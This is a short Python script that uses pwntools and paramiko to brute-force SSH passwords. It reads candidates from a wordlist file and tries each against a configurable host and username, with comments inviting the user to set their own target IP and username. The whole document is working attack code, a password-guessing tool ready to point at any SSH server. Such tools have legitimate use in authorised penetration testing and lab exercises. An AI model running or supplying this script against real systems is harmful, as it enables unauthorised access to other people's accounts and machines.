from pwn import *
import paramiko

host = '127.0.0.1' # change your target IP here
username = 'kali' # change your taget username here
attempts = 0

# change your desired wordlist here; wordlist path is from the current folder of script.py

with open('common-passwords.txt', 'r') as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("\n[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!\n".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		except KeyboardInterrupt:
			print("\n[X] Process was interrupted by the user.")
			break
		attempts += 1
